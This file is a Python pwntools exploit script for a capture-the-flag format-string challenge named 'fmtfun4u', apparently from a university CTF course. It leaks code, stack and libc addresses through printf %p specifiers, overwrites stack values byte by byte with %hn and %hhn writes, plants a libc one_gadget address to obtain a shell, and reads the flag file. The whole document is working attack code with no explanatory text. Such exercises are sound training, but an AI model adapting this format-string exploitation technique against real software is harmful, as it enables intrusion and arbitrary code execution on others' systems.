import time
from pwn import *
LOCAL = False
binary = './fmtfun4u'

def pause():
    if LOCAL:
        raw_input('pause')
    else:
        time.sleep(0.2)

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10136)

context.arch = 'amd64'
libc = ELF('libc.so.6', checksec=False)

def ss(line, drop=False):
    r.sendline(line)
    if drop:
        r.clean(1)
    else:
        return r.recvuntil('Input:').rstrip('\nInput:')

r.recvuntil('Input:')
leak_code, leak_stack = [int(leak[2:], 16) for leak in ss('%8$p.%11$p').split('.')]
code_base = leak_code - 0xa80
leak_stack -= 0x100

rbp0x30 = leak_stack + 0x38
main_i_addr = leak_stack + 0x14
buf_addr = leak_code + 0x201020
printf_got_addr = code_base + 0x200fc0
print "code_base: ", hex(code_base)
print "leak stack:", hex(leak_stack)
print "main_i_addr:", hex(main_i_addr)
print "buf_addr:", hex(buf_addr)
print "printf_got_addr:", hex(printf_got_addr)

magic = int(hex(main_i_addr)[-4:], 16)
print "1"
ss('%'+str(magic)+'c%11$hn', drop=True)
print "2"
ss('%240c%37$hhn')
print "3"
ss('%37$p') # this dosen't read to Input: , don't know why
if r.can_recv():
    if hex(main_i_addr) == r.recvuntil('Input:').rstrip('\nInput:'):
        log.success('can write about 240 times')
    else:
        log.error('try again')

# to skip 00
printf_got_addr += 1

magic = int(hex(main_i_addr+0x4)[-2:], 16)
ss('%'+str(magic)+'c%11$hhn', drop=True)
print "move 37$ to", ss('%37$p') # check
magic = int(hex(printf_got_addr)[-2:], 16)
ss('%'+str(magic)+'c%37$hhn')
print "check", ss('%8$p') # check

magic = int(hex(main_i_addr+0x5)[-2:], 16)
ss('%'+str(magic)+'c%11$hhn', drop=True)
print "move 37$ to", ss('%37$p') # check
magic = int(hex(printf_got_addr)[-4:-2], 16)
ss('%'+str(magic)+'c%37$hhn')
print "check", ss('%8$p') # check

magic = int(hex(main_i_addr+0x6)[-2:], 16)
ss('%'+str(magic)+'c%11$hhn', drop=True)
print "move 37$ to", ss('%37$p') # check
magic = int(hex(printf_got_addr)[-6:-4], 16)
ss('%'+str(magic)+'c%37$hhn')
got_addr = ss('%8$p') # check

if got_addr == hex(printf_got_addr):
    log.success('move 8$ to printf_got')
else:
    print "you moved to ", got_addr
    log.error('try again')

result_got = ss('%8$.8s') # check
libc_base = None
if len(result_got) == 5:
    log.success('leak printf_got: ' + result_got)
    printf_got_content = int((result_got[::-1] + '\x00').encode('hex'), 16)
    libc_base = printf_got_content - libc.symbols['printf']
    log.info('libc_base: ' + hex(printf_got_content))
    log.info('libc_base: ' + hex(libc_base))
else:
    log.error('try again')
    
one_gadget = libc_base + 0x4526a
def tmp2(num):
    magic = int(hex(leak_stack+0x8+num)[-2:], 16)
    ss('%'+str(magic)+'c%11$hhn', drop=True)
    print "move 37$ to", ss('%37$p') # check
    seg = hex(one_gadget)[-((num+1)*2):-(num*2)]
    if num == 0:
        seg = hex(one_gadget)[-2:]
    magic = int(seg, 16)
    ss('%'+str(magic)+'c%37$hhn')
    print "check", ss('%6$p') # check

for i in range(5):
    tmp2(i)

if ss('%6$p') == hex(one_gadget):
    log.success('change 6$ to one_gadget')
    print "one_gadget:", hex(one_gadget)
else:
    log.error('try again')

print "rbp-0x30:", hex(rbp0x30)
magic = int(hex(rbp0x30)[-2:], 16)
ss('%'+str(magic)+'c%11$hhn', drop=True)
print "move 37$ to", ss('%37$p') # check
ss('%37$n')
magic = int(hex(rbp0x30+0x4)[-2:], 16)
ss('%'+str(magic)+'c%11$hhn', drop=True)
print "move 37$ to", ss('%37$p') # check
ss('%37$n')

print "last"
magic = int(hex(leak_stack)[-2:], 16)
ss('%'+str(magic)+'c%11$hhn', drop=True)
print "move 37$ to", ss('%37$p') # check
magic = int(hex(0xe4), 16)
r.sendline('%'+str(magic)+'c%37$hhn')

sleep(0.2)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
